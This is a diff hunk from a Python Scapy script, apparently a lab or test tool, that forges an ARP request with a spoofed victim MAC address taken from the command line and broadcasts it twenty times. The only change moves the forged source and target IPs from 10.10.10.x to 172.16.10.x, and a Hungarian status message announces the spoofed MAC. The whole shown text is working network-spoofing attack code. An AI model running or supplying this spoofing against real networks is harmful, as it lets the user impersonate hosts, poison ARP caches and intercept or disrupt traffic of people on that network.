@@ -11,7 +11,7 @@ def main():
     iface, victim_mac = sys.argv[1], sys.argv[2]
     conf.iface = iface
     frame = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / \
-            ARP(op=1, hwsrc=victim_mac, psrc="10.10.10.77", pdst="10.10.10.1")
+            ARP(op=1, hwsrc=victim_mac, psrc="172.16.10.77", pdst="172.16.10.1")
     print(f"[*] ARP Request a spoofolt MAC-címmel ({victim_mac})...")
     for _ in range(20):
         sendp(frame, verbose=0)
